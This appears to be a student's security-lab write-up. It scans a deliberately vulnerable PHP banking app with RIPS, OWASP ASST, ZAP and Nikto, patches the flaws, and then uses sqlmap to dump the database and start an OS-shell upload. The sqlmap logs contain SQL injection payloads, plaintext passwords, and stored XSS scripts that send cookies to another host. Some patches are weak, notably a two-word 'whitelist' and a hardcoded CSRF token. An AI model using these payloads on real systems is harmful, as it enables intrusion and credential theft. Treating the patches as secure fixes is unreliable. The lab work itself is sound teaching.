### Exercise 1: White Box Web Application Vulnerability Testing
__1. Apply your chosen scanner on the unpatched version of the source code of your webapplication. Identify the vulnerabilities which were not found by the tool and briefly explain why the tool was unable to find them (try to condense your answer to particular classes of vulnerabilities)?__

__Solution :__

**Chosen scanners:** 
   - RIPS
   - OWASP ASST

**Installation:**
   - **RIPS:**
      - Extract the files to your local web server's document root (in my case /var/www/html/).
      - To run the tool open the browser at http://localhost/rips-master.
      - Give a location to the code for testing in the *Path/file* field. 
      - Select *Verbosity level*: 4.
      - *Vulnerability type*: can select all or a particular vulnerability and hit scan.
         
      ![RIPS_SCAN](../task3/images/RIPS_SCAN.JPG)
      
   
   - **OWASP ASST:**
      -  Install [Xampp](https://sourceforge.net/projects/xampp/files/XAMPP%20Linux/5.6.40/) the same version used for the project (PHP-5).
      -  Put the project to test in Xampp folder `/opt/lampp/htdocs/vbank`. 
      -  Install Node.js.
      
      ```bash
         sudo apt-get install nodejs -y
         sudo apt-get install npm -y
         sudo npm install n -g
         sudo n 12.13.0
        ```    
      - Put the code of [ASST](https://github.com/OWASP/ASST) in the same folder `/opt/lampp/htdocs/ASST`.
      - Change `DEFAULT_PROJECT_PATH_TO_SCAN` in `config.js` to following.
      
      ```js
         DEFAULT_PROJECT_PATH_TO_SCAN: "/var/www/vbank_code/", // Path to project to test
      ```
     - Change following fields in `config_php_lang.js` to following.   
     
     ```js
      PHP_EXE_BIN_PATH: "/usr/bin/php", 
      IS_DBMS_USED: true,
      DBMS: "mysql",
      // if above IS_DBMS_USED = true, bellow settings are enabled and must be set
      YOUR_WEBAPP_DBMS_SERVER_IP: "127.0.0.1", 
      YOUR_WEBAPP_DBMS_DB_NAME: "vbank",
      YOUR_WEBAPP_DBMS_USERNAME: "root",
      YOUR_WEBAPP_DBMS_PASSWORD: "kakashi",
     ```
     ```bash
      sudo /opt/lampp/lampp start xampp
      cd /opt/lampp/htdocs/ASST
      node main.js
     ```
      ![ASST_SCAN](../task3/images/ASST_SCAN.JPG)

#### Vulnerabilities found (Test from both RIPS and ASST)           
| Vulnerability type          | RIPS | OWASP ASST |
| --------------------------- | ---- | ---------- |
| SQL Injection               | 17   | 21         |
| Cross site scripting        | 95   | 2          |
| Cross-Site Request Forgery  | 0    | 6          |
| Server-side request forgery | 0    | 0          |
| Local file inclusion        | 5    | 0          |
| Broken Authentication       | 0    | 6          |
| Session Hijacking           | 0    | 0          |
| Session Fixation            | 1    | 0          |
| Remote code Injection       | 1    | 0          |
| Sensitive Data Exposure     | 0    | 7          |
| Known Vulnerabilities       | 0    | 2          |


__1.1 Why the tool was unable to find them?__

- Every tool has its own rules and uses different techniques to detect vulnerabilities.
- Tool didn't find vulnerabilities such as Authentication problems, Access Control issues, insecure use of Cryptography.
  - This is due to a lack of compilation instructions, access to remote APIs inability to find the right libraries.
- RIPS didn't find CSRF AND SSRF because it was not included in rules whereas ASST detected CSRF because it has rules defined for CSRF vulnerabilities.






__2. Run the analysis again using the patched version of the source code of your web-application.
Check whether the vulnerabilities found before are still reported or not.__
__solution :__

#### Vulnerabilities Fix (Test RIPS)         
| Vulnerability type      | location                                      | security patch           | Test case                                                       | Result          |
| ----------------------- | --------------------------------------------- | ------------------------ | --------------------------------------------------------------- | --------------- |
| SQL Injection           | /vbank_code/pages/htbloanreq.page line 30     | mysql_real_escape_string | ---                                                             | POSITIVE        |
| File Inclusion          | vbank_code/etc/htb.inc line 24                | ---                      | There are no `include_once()` methods accepting user input      | FALSE POSITIVE  |
| Code Execution          | vbank_code/pages/htbdetails.page line 95      | Whitelisting             | ---                                                             | POSITIVE        |
| Cross-Site Scripting    | /vbank_code/pages/htbdetails.page line 85,102 | htmlspecialchars         | ---                                                             | FALSE POSITIVE |
| Session Fixation        | /vbank_code/etc/htb.inc line 53               | ---                      | There is no `setcookie` method accepting user input             | POSITIVE  |
| HTTP Response Splitting | vbank_code/etc/htb.inc line 27                | ---                      | The `URL` used in `header` method already have a security check | FALSE POSITIVE  |
| Reflection Injection    | vbank_code/htdocs/index.php line 21           | ---                      | `ob_start()` is not accepting user input                        | FALSE POSITIVE  |

- Red dot indicate there is an user-implemented security patch. 
![RIPS_ICONS](../task3/images/RIPS_ICONS.JPG)

**Test Cases:**
- **SQL Injection**
   - RIPS Scanner detected the SQLi if the code used the `mysql_query` function.<br/>
   ![RIPS_SQLI](../task3/images/RIPS_SQLI.JPG)
   - Variables (passed from other PHP classes or user input) used in `mysql_query` are protected using `mysql_real_escape_string`.<br/>
   ![RIPS_SQLI_FIX](../task3/images/RIPS_SQLI_FIX.JPG) 
- **Code Execution**
   - Vulnarable code
   ```php
   $replaceWith =  preg_replace('#\b". str_replace('\\', '\\\\', ". $http['query'] ."\b#i', '<span class=\"queryHighlight\">\\\\0</span>','\\0');
   ``` 
   ![RIPS_CODE_EXE](../task3/images/RIPS_CODE_EXE.JPG)
   <br/>
   - Security patch 
<!--    - TODO: htmlspecialchars($http['query'])  -->

   ``` php
      $whitelists  = ['system','phpinfo']	;			
                     $string = $http['query'];
                     foreach ($whitelists as $whitelist) {
                         if (strpos($string, $whitelist) !== FALSE) {
                              $replaceWith =  "preg_replace('#\b". str_replace('\\', '\\\\', 'phpinfoReplaces') ."\b#i', '<span class=\"queryHighlight\">\\\\0</span>','\\0')";
                              break;
                         }else{
                              //echo "kakashi";
                              $replaceWith =  "preg_replace('#\b". str_replace('\\', '\\\\',$string) ."\b#i', '<span class=\"queryHighlight\">\\\\0</span>','\\0')";
                            }
                        }
    ```
   
   ![RIPS_CODE_EXE_FIX](../task3/images/RIPS_CODE_EXE_FIX.JPG)
   
   ![RIPS_CODE_EXE_TESTCASE](../task3/images/RIPS_CODE_EXE_TESTCASE.JPG)
   ![RIPS_CODE_EXE_TESTCASE2](../task3/images/RIPS_CODE_EXE_TESTCASE2.JPG)
  
- **Cross Site Scripting:**
   - Use `htmlspecialchars` to display data.
   - `transfersStr` is a string containing HTML table in it so `htmlspecialchars` cant be used. 
   - We can apply the `htmlspecialchars` to Row data used in transfersStr. This resulted in false positives but it is no longer vulnerable to XSS.
  ![RIPS_XSS](../task3/images/RIPS_XSS.JPG)
  ![RIPS_XSS_FIX](../task3/images/RIPS_XSS_FIX.JPG)
  ![RIPS_XSS_TESTCASE](../task3/images/RIPS_XSS_TESTCASE.JPG)
  

#### Vulnerabilities Fix (Test ASST)         
| Vulnerability type                          | location                                | security patch                    | Test | Test case | Result   |
| ------------------------------------------- | --------------------------------------- | --------------------------------- | ---- | --------- | -------- |
| SQL Injection                               | /vbank_code/htdocs/login.php line 17    | Preparedstatements                | ASST | ---       | POSITIVE |
| Cross Site Scripting                        | /vbank_code/htdocs/login.php line 14,15 | htmlentities and htmlspecialchars | ASST | ---       | POSITIVE |
| Cross-Site Request Forgery                  | vbank_code/pages/htbchgpwd.php          | CSRF Token                        | ASST | ---       | POSITIVE |
| Sensitive Data Exposure Vulnerabilities     | Passwords are not stored in Hash        | HASH the password                 | ASST | ---       | ---      |
| Using Components With Known Vulnerabilities | PHP Version is 5.6                      | Use new versions of PHP           | ASST | ---       | ---      |
| Broken Authentication Vulnerabilities       | /vbank_code/pages/htbchgpwd.php         | Implement Google reCaptcha        | ASST | ---       | ---      |

**Test Cases:**
- **SQL Injection**
     - Prepared statement
     
        ```
        if ($stmt = $link->prepare("SELECT id,password,username,name,firstname,time,lasttime,lastip from users where username =? and password=?")) {   
               $stmt->bind_param("ss", $username,$password);
               $stmt -> execute();
               $stmt -> store_result();
               $stmt -> bind_result($id,$password,$username,$name,$firstname,$time,$lasttime,$lastip);
         }
         ```
 ![ASST_SQLI](../task3/images/ASST_SQLI.JPG)
 ![ASST_SQLI_FIX](../task3/images/ASST_SQLI_FIX.JPG)
 ![ASST_SQLI_TESTCASE](../task3/images/ASST_SQLI_TESTCASE.JPG)
- **Cross Site Scripting**
   - Vulnarable code
   ```$username = $_REQUEST['username'];
      $password = $_REQUEST['password'];
   ```
   - Security patch
   ```$username = htmlentities(htmlspecialchars($_REQUEST['username']);
      $password = htmlentities(htmlspecialchars($_REQUEST['password']);
   ```

![ASST_XSS](../task3/images/ASST_XSS.JPG)
![ASST_XSS_FIX](../task3/images/ASST_XSS_FIX.JPG)
- **Cross-Site Request Forgery**
- Security patch
   ```html
    <input type="hidden" name="csrf_token" value="csrftoken" />
   ```
   - Use the same token value on the server side to validate.

![ASST_CSRF](../task3/images/ASST_CSRF.JPG)
![ASST_CSRF_FIX](../task3/images/ASST_CSRF_FIX.JPG)



### Exercise 2: Black-Box Web Application Vulnerability Testing

__1. Download two web vulnerability scanners and describe the all needed set-up environment
settings__
__solution :__
1. Owasp Zed Attack Proxy (Linux) (Avaialble in `kali Linux`)
   - Download the program from https://www.zaproxy.org/download/ , and select the Linux installer
   - run the file `./ZAP_2_10_0_unix.sh`
   - after successfull installation run the file from command line `$: zapproxy`
   - An gui app will be opened if ran without errors.
   
![zap_interface](../task3/images/zap_interface.PNG)


2. Nikto Vulnerabuility Scanner
- A command line web vulnerability scanner

```bash
git clone https://github.com/sullo/nikto
# Main script is in program/
cd nikto/program
# Run using the shebang interpreter
./nikto.pl -h http://www.vbank.com
# Run using perl (if you forget to chmod)
perl nikto.pl -h http://www.vbank.com

# to use the proxy
perl nikto.pl -h http://www.vbank.com -useproxy
```
  - Avialble by Default in Kali installation
  - Run the application `nikto -h http://vbank.com`

![nikto_sample_usage](../task3/images/nikto_sample.PNG)




__2. Report how you found the different vulnerabilities: SQLi, XSS, etc.__
__solution__
1. Nikto Vulnerability Scanner
   - Run the nikto from command line with `--host` switch for host url

![nikto_results](../task3/images/nikto_results.PNG)

- Vulnerabilities/info found:
1. Clickjacking
2. Cross site scripting
3. Directory traversal
4. cookie without httponly flag
5. Server information in response headers



2. Owasp Zap vulnerability scanner
-  run the zapproxy `zapproxy` and click on the `automated scan`
![zed attack proxy](../task3/images/zap_intro.png)
<br>
- Results



# ZAP Scanning Report

Generated on Sun, 30 May 2021 06:02:45


## Summary of Alerts

| Risk Level    | Number of Alerts |
| ------------- | ---------------- |
| High          | 1                |
| Medium        | 1                |
| Low           | 4                |
| Informational | 2                |

## Alerts (From Report)

| Name                                                  | Risk Level    | Number of Instances |
| ----------------------------------------------------- | ------------- | ------------------- |
| Cross Site Scripting (DOM Based)                      | High          | 1                   |
| X-Frame-Options Header Not Set                        | Medium        | 3                   |
| Absence of Anti-CSRF Tokens                           | Low           | 3                   |
| Cookie No HttpOnly Flag                               | Low           | 1                   |
| Cookie Without SameSite Attribute                     | Low           | 1                   |
| X-Content-Type-Options Header Missing                 | Low           | 19                  |
| Information Disclosure - Sensitive Information in URL | Informational | 3                   |
| Information Disclosure - Suspicious Comments          | Informational | 1                   |

#### Alerts (Manual test From Generated report from ZAP)
| Name                                                  | Risk Level    | Number of Instances | **False Positive** |
| ----------------------------------------------------- | ------------- | ------------------- | ------------------ |
| Cross Site Scripting (DOM Based)                      | High          | 1                   | **Yes**            |
| X-Frame-Options Header Not Set                        | Medium        | 3                   | **No**             |
| Absence of Anti-CSRF Tokens                           | Low           | 3                   | **No**             |
| Cookie No HttpOnly Flag                               | Low           | 1                   | **No**             |
| Cookie Without SameSite Attribute                     | Low           | 1                   | **No**             |
| X-Content-Type-Options Header Missing                 | Low           | 19                  | **No**             |
| Information Disclosure - Sensitive Information in URL | Informational | 3                   | **No**             |
| Information Disclosure - Suspicious Comments          | Informational | 1                   | **No**             |


__3. Now you have collected enough information about the victim web application and found
multiple serious SQL injection vulnerabilities.
Use an automatic exploitation tool (e.g. sqlmap) to dump all the database, upload a web shell
and prove that you have control of the bank server!__

- Using `sqlmap` to find sql injection and dump database content
- Usage
```bash
$: sqlmap -u 'http://192.168.37.128/login.php?username=alex' --dbs
```
__Result:__

![sqlmap_dbs](../task3/images/sqlmap_dbs.PNG)

- Found `vbank` database (along with others)
- use `--dump` as switch and dump the contents of database `vbank` with `-D` switch
```bash
$ sqlmap -u 'http://192.168.37.128/login.php?username=alex' -D vbank --dump
        ___
       __H__                                                                                                                                                                                   
 ___ ___["]_____ ___ ___  {1.5.2#stable}                                                                                                                                                       
|_ -| . [)]     | .'| . |                                                                                                                                                                      
|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                      
      |_|V...       |_|   http://sqlmap.org                                                                                                                                                    

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 06:17:40 /2021-05-30/

[06:17:40] [INFO] resuming back-end DBMS 'mysql' 
[06:17:40] [INFO] testing connection to the target URL
got a 302 redirect to 'http://192.168.37.128/index.php'. Do you want to follow? [Y/n] y
you have not declared cookie(s), while server wants to set its own ('USECURITYID=b3t2gfp7jtn...4vqj114ml5'). Do you want to use those [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=alex' AND (SELECT 3713 FROM (SELECT(SLEEP(5)))DePN) AND 'wVsF'='wVsF

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: username=-3760' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170707a71,0x556c6c594452414f576a744a73504d734d74537a474957704c684b6a6d676f79496e694477664d67,0x7170766b71)-- -
---
[06:17:42] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.46
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[06:17:42] [INFO] fetching tables for database: 'vbank'
[06:17:42] [INFO] fetching columns for table 'users' in database 'vbank'
[06:17:42] [INFO] fetching entries for table 'users' in database 'vbank'
Database: vbank
Table: users
[5 entries]
+---------------------+-------------+---------------------+---------------------+---------------------+----------+----------+-----------+
| id                  | name        | time                | lastip              | lasttime            | password | username | firstname |
+---------------------+-------------+---------------------+---------------------+---------------------+----------+----------+-----------+
| 1                   | Lexo        | 2014-03-02 00:00:00 | 192.168.37.128      | 2021-05-24 05:28:33 | test1234 | alex     | Alex      |
| 2                   | Obby        | 2014-03-02 00:00:00 | 192.168.37.128      | 2021-05-23 15:38:18 | b0BP4S5  | bob      | Bob       |
| 2021-04-21 11:45:18 | <blank>     | 3                   | smurf               | smurf               | <blank>  | <blank>  | 127.0.0.1 |
| 2021-04-21 13:09:28 | <blank>     | 77                  | metest              | metest              | <blank>  | <blank>  | 127.0.0.1 |
| 127.0.0.1           | password123 | chaplin             | 2021-05-01 18:32:08 | charlie             | charlie  | <blank>  | 99999     |
+---------------------+-------------+---------------------+---------------------+---------------------+----------+----------+-----------+

[06:17:42] [INFO] table 'vbank.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.37.128/dump/vbank/users.csv'
[06:17:42] [INFO] fetching columns for table 'currencies' in database 'vbank'
[06:17:42] [INFO] fetching entries for table 'currencies' in database 'vbank'
Database: vbank
Table: currencies
[2 entries]
+----+------+
| id | name |
+----+------+
| 1  | $    |
| 2  | €    |
+----+------+

[06:17:42] [INFO] table 'vbank.currencies' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.37.128/dump/vbank/currencies.csv'
[06:17:42] [INFO] fetching columns for table 'banks' in database 'vbank'
[06:17:42] [INFO] fetching entries for table 'banks' in database 'vbank'
Database: vbank
Table: banks
[4 entries]
+----+----------+--------+
| id | code     | name   |
+----+----------+--------+
| 1  | 20999999 | P-Bank |
| 2  | 20888888 | C-Bank |
| 3  | 20555555 | S-Bank |
| 4  | 41131337 | V-Bank |
+----+----------+--------+

[06:17:42] [INFO] table 'vbank.banks' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.37.128/dump/vbank/banks.csv'
[06:17:42] [INFO] fetching columns for table 'loans' in database 'vbank'
[06:17:42] [INFO] fetching entries for table 'loans' in database 'vbank'
Database: vbank
Table: loans
[6 entries]
+----+-------+---------------------+--------+----------+----------+----------+-----------+
| id | owner | time                | amount | period   | debitacc | interest | creditacc |
+----+-------+---------------------+--------+----------+----------+----------+-----------+
| 10 | 1     | 2014-03-27 04:37:05 | 1000   | 1        | 33333333 | 4.2      | 11111111  |
| 12 | 1     | 2021-04-18 11:19:41 | 9      | 1        | 33333333 | 4.2      | 11111111  |
| 13 | 1     | 2021-04-18 11:20:56 | 10     | 1        | 33333333 | 4.2      | 11111111  |
| 14 | 1     | 2021-04-25 09:59:22 | 1      | 1        | 33333333 | 4.2      | 11111111  |
| 15 | 1     | 2021-05-01 05:01:13 | 10000  | 1        | 33333333 | -4.2     | 11111111  |
| 16 | 1     | 2021-05-10 09:37:41 | 3      | 1        | 33333333 | 4.2      | 11111111  |
+----+-------+---------------------+--------+----------+----------+----------+-----------+

[06:17:43] [INFO] table 'vbank.loans' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.37.128/dump/vbank/loans.csv'
[06:17:43] [INFO] fetching columns for table 'typesAcc' in database 'vbank'
[06:17:43] [INFO] fetching entries for table 'typesAcc' in database 'vbank'
Database: vbank
Table: typesAcc
[2 entries]
+----+--------+
| id | name   |
+----+--------+
| 1  | Local  |
| 2  | Global |
+----+--------+

[06:17:43] [INFO] table 'vbank.typesAcc' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.37.128/dump/vbank/typesAcc.csv'
[06:17:43] [INFO] fetching columns for table 'branches' in database 'vbank'
[06:17:43] [INFO] fetching entries for table 'branches' in database 'vbank'
Database: vbank
Table: branches
[4 entries]
+----+----------+
| id | name     |
+----+----------+
| 1  | Berlin   |
| 2  | Passau   |
| 3  | Stutgart |
| 4  | Bonn     |
+----+----------+

[06:17:43] [INFO] table 'vbank.branches' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.37.128/dump/vbank/branches.csv'
[06:17:43] [INFO] fetching columns for table 'accounts' in database 'vbank'
[06:17:43] [INFO] fetching entries for table 'accounts' in database 'vbank'
Database: vbank
Table: accounts
[3 entries]
+------+-------+--------+---------+----------+---------+---------------------+----------+
| type | owner | branch | curbal  | account  | deposit | modtime             | currency |
+------+-------+--------+---------+----------+---------+---------------------+----------+
| 2    | 1     | 2      | 10158.3 | 11111111 | 0       | 2021-05-23 15:37:36 | 1        |
| 2    | 2     | 3      | 213.2   | 22222222 | 0       | 2021-05-23 15:37:36 | 1        |
| 2    | 1     | 4      | 1136.5  | 33333333 | 0       | 2021-05-23 15:33:36 | 2        |
+------+-------+--------+---------+----------+---------+---------------------+----------+

[06:17:43] [INFO] table 'vbank.accounts' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.37.128/dump/vbank/accounts.csv'
[06:17:43] [INFO] fetching columns for table 'transfers' in database 'vbank'
[06:17:43] [INFO] fetching entries for table 'transfers' in database 'vbank'
Database: vbank
Table: transfers
[7 entries]
+----+---------------------+--------+----------+---------------------------------------------------------------------------------------------+----------+----------+----------+
| id | time                | amount | dstacc   | remark                                                                                      | srcacc   | dstbank  | srcbank  |
+----+---------------------+--------+----------+---------------------------------------------------------------------------------------------+----------+----------+----------+
| 4  | 2014-03-29 04:14:07 | 70     | 22222222 | Refund                                                                                      | 11111111 | 41131337 | 41131337 |
| 5  | 2014-03-29 04:24:33 | 300    | 11111111 | WG rent                                                                                     | 22222222 | 41131337 | 41131337 |
| 7  | 2014-03-30 03:46:13 | 110    | 11111111 | Insurance                                                                                   | 22222222 | 41131337 | 41131337 |
| 91 | 2021-05-19 10:04:08 | 6      | 3        | test                                                                                        | 11111111 | 41131337 | 41131337 |
| 92 | 2021-05-19 10:04:35 | 6      | 33333333 | 5                                                                                           | 11111111 | 41131337 | 41131337 |
| 93 | 2021-05-23 15:33:36 | 1      | 33333333 | <script>new Image().src="http://192.168.37.128:81/cookie.html?c="+document.cookie;</script> | 11111111 | 20888888 | 41131337 |
| 94 | 2021-05-23 15:37:36 | 6      | 22222222 | <script>new Image().src="http://192.168.37.128:81/c="+document.cookie;</script>             | 11111111 | 41131337 | 41131337 |
+----+---------------------+--------+----------+---------------------------------------------------------------------------------------------+----------+----------+----------+

[06:17:43] [INFO] table 'vbank.transfers' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.37.128/dump/vbank/transfers.csv'
[06:17:43] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.37.128'


```

  
  
  
  












Step 2- Dump the databse obtained from the previous step

```bash
└─$ sqlmap -u 'http://192.168.37.128/login.php?username=alex' -D vbank --dump            
        ___
       __H__                                                                                                                        
 ___ ___["]_____ ___ ___  {1.5.2#stable}                                                                                            
|_ -| . [.]     | .'| . |                                                                                                           
|___|_  [,]_|_|_|__,|  _|                                                                                                           
      |_|V...       |_|   http://sqlmap.org                                                                                         

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 06:29:59 /2021-05-24/

[06:30:00] [INFO] resuming back-end DBMS 'mysql' 
[06:30:00] [INFO] testing connection to the target URL
got a 302 redirect to 'http://192.168.37.128/index.php'. Do you want to follow? [Y/n] y
you have not declared cookie(s), while server wants to set its own ('USECURITYID=ejvdcqd1ljl...5evf7j65e5'). Do you want to use those [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=alex' AND (SELECT 3713 FROM (SELECT(SLEEP(5)))DePN) AND 'wVsF'='wVsF

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: username=-3760' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170707a71,0x556c6c594452414f576a744a73504d734d74537a474957704c684b6a6d676f79496e694477664d67,0x7170766b71)-- -
---
[06:37:59] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.46
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[06:37:59] [INFO] fetching tables for database: 'vbank'
[06:37:59] [INFO] fetching columns for table 'currencies' in database 'vbank'
[06:37:59] [INFO] fetching entries for table 'currencies' in database 'vbank'
Database: vbank
Table: currencies
[2 entries]
+----+------+
| id | name |
+----+------+
| 1  | $    |
| 2  | €    |
+----+------+

[06:37:59] [INFO] table 'vbank.currencies' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.37.128/dump/vbank/currencies.csv'                                                                                                                          
[06:37:59] [INFO] fetching columns for table 'transfers' in database 'vbank'
[06:37:59] [INFO] fetching entries for table 'transfers' in database 'vbank'
Database: vbank
Table: transfers
[7 entries]
+----+---------------------+--------+----------+---------------------------------------------------------------------------------------------+----------+----------+----------+
| id | time                | amount | dstacc   | remark                                                                                      | srcacc   | dstbank  | srcbank  |
+----+---------------------+--------+----------+---------------------------------------------------------------------------------------------+----------+----------+----------+
| 4  | 2014-03-29 04:14:07 | 70     | 22222222 | Refund                                                                                      | 11111111 | 41131337 | 41131337 |
| 5  | 2014-03-29 04:24:33 | 300    | 11111111 | WG rent                                                                                     | 22222222 | 41131337 | 41131337 |
| 7  | 2014-03-30 03:46:13 | 110    | 11111111 | Insurance                                                                                   | 22222222 | 41131337 | 41131337 |
| 91 | 2021-05-19 10:04:08 | 6      | 3        | test                                                                                        | 11111111 | 41131337 | 41131337 |
| 92 | 2021-05-19 10:04:35 | 6      | 33333333 | 5                                                                                           | 11111111 | 41131337 | 41131337 |
| 93 | 2021-05-23 15:33:36 | 1      | 33333333 | <script>new Image().src="http://192.168.37.128:81/cookie.html?c="+document.cookie;</script> | 11111111 | 20888888 | 41131337 |
| 94 | 2021-05-23 15:37:36 | 6      | 22222222 | <script>new Image().src="http://192.168.37.128:81/c="+document.cookie;</script>             | 11111111 | 41131337 | 41131337 |
+----+---------------------+--------+----------+---------------------------------------------------------------------------------------------+----------+----------+----------+

[06:37:59] [INFO] table 'vbank.transfers' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.37.128/dump/vbank/transfers.csv'                                                                                                                            
[06:37:59] [INFO] fetching columns for table 'branches' in database 'vbank'
[06:38:00] [INFO] fetching entries for table 'branches' in database 'vbank'
Database: vbank
Table: branches
[4 entries]
+----+----------+
| id | name     |
+----+----------+
| 1  | Berlin   |
| 2  | Passau   |
| 3  | Stutgart |
| 4  | Bonn     |
+----+----------+

[06:38:00] [INFO] table 'vbank.branches' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.37.128/dump/vbank/branches.csv'                                                                                                                              
[06:38:00] [INFO] fetching columns for table 'banks' in database 'vbank'
[06:38:00] [INFO] fetching entries for table 'banks' in database 'vbank'
Database: vbank
Table: banks
[4 entries]
+----+----------+--------+
| id | code     | name   |
+----+----------+--------+
| 1  | 20999999 | P-Bank |
| 2  | 20888888 | C-Bank |
| 3  | 20555555 | S-Bank |
| 4  | 41131337 | V-Bank |
+----+----------+--------+

[06:38:00] [INFO] table 'vbank.banks' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.37.128/dump/vbank/banks.csv'
[06:38:00] [INFO] fetching columns for table 'accounts' in database 'vbank'
[06:38:00] [INFO] fetching entries for table 'accounts' in database 'vbank'
Database: vbank
Table: accounts
[3 entries]
+------+-------+--------+---------+----------+---------+---------------------+----------+
| type | owner | branch | curbal  | account  | deposit | modtime             | currency |
+------+-------+--------+---------+----------+---------+---------------------+----------+
| 2    | 1     | 2      | 10158.3 | 11111111 | 0       | 2021-05-23 15:37:36 | 1        |
| 2    | 2     | 3      | 213.2   | 22222222 | 0       | 2021-05-23 15:37:36 | 1        |
| 2    | 1     | 4      | 1136.5  | 33333333 | 0       | 2021-05-23 15:33:36 | 2        |
+------+-------+--------+---------+----------+---------+---------------------+----------+

[06:38:00] [INFO] table 'vbank.accounts' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.37.128/dump/vbank/accounts.csv'                                                                                                                              
[06:38:00] [INFO] fetching columns for table 'typesAcc' in database 'vbank'
[06:38:00] [INFO] fetching entries for table 'typesAcc' in database 'vbank'
Database: vbank
Table: typesAcc
[2 entries]
+----+--------+
| id | name   |
+----+--------+
| 1  | Local  |
| 2  | Global |
+----+--------+

[06:38:00] [INFO] table 'vbank.typesAcc' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.37.128/dump/vbank/typesAcc.csv'                                                                                                                              
[06:38:00] [INFO] fetching columns for table 'loans' in database 'vbank'
[06:38:00] [INFO] fetching entries for table 'loans' in database 'vbank'
Database: vbank
Table: loans
[6 entries]
+----+-------+---------------------+--------+----------+----------+----------+-----------+
| id | owner | time                | amount | period   | debitacc | interest | creditacc |
+----+-------+---------------------+--------+----------+----------+----------+-----------+
| 10 | 1     | 2014-03-27 04:37:05 | 1000   | 1        | 33333333 | 4.2      | 11111111  |
| 12 | 1     | 2021-04-18 11:19:41 | 9      | 1        | 33333333 | 4.2      | 11111111  |
| 13 | 1     | 2021-04-18 11:20:56 | 10     | 1        | 33333333 | 4.2      | 11111111  |
| 14 | 1     | 2021-04-25 09:59:22 | 1      | 1        | 33333333 | 4.2      | 11111111  |
| 15 | 1     | 2021-05-01 05:01:13 | 10000  | 1        | 33333333 | -4.2     | 11111111  |
| 16 | 1     | 2021-05-10 09:37:41 | 3      | 1        | 33333333 | 4.2      | 11111111  |
+----+-------+---------------------+--------+----------+----------+----------+-----------+

[06:38:00] [INFO] table 'vbank.loans' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.37.128/dump/vbank/loans.csv'
[06:38:00] [INFO] fetching columns for table 'users' in database 'vbank'
[06:38:00] [INFO] fetching entries for table 'users' in database 'vbank'
Database: vbank
Table: users
[5 entries]
+---------------------+-------------+---------------------+---------------------+---------------------+----------+----------+-----------+
| id                  | name        | time                | lastip              | lasttime            | password | username | firstname |
+---------------------+-------------+---------------------+---------------------+---------------------+----------+----------+-----------+
| 1                   | Lexo        | 2014-03-02 00:00:00 | 192.168.37.128      | 2021-05-24 05:28:33 | test1234 | alex     | Alex      |
| 2                   | Obby        | 2014-03-02 00:00:00 | 192.168.37.128      | 2021-05-23 15:38:18 | b0BP4S5  | bob      | Bob       |
| 2021-04-21 11:45:18 | <blank>     | 3                   | smurf               | smurf               | <blank>  | <blank>  | 127.0.0.1 |
| 2021-04-21 13:09:28 | <blank>     | 77                  | metest              | metest              | <blank>  | <blank>  | 127.0.0.1 |
| 127.0.0.1           | password123 | chaplin             | 2021-05-01 18:32:08 | charlie             | charlie  | <blank>  | 99999     |
+---------------------+-------------+---------------------+---------------------+---------------------+----------+----------+-----------+

[06:38:00] [INFO] table 'vbank.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.37.128/dump/vbank/users.csv'
[06:38:00] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.37.128'

[*] ending @ 06:38:00 /2021-05-24/

```


- Uploading a shell


```bash
$ sqlmap -u 'http://192.168.37.128/login.php?username=alex' --os-shell                   148 ⨯ 1 ⚙
        ___
       __H__                                                                                         
 ___ ___[']_____ ___ ___  {1.5.2#stable}                                                             
|_ -| . [.]     | .'| . |                                                                            
|___|_  [(]_|_|_|__,|  _|                                                                            
      |_|V...       |_|   http://sqlmap.org                                                          

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 06:23:35 /2021-05-30/

[06:23:35] [INFO] resuming back-end DBMS 'mysql' 
[06:23:35] [INFO] testing connection to the target URL
got a 302 redirect to 'http://192.168.37.128/index.php'. Do you want to follow? [Y/n] y
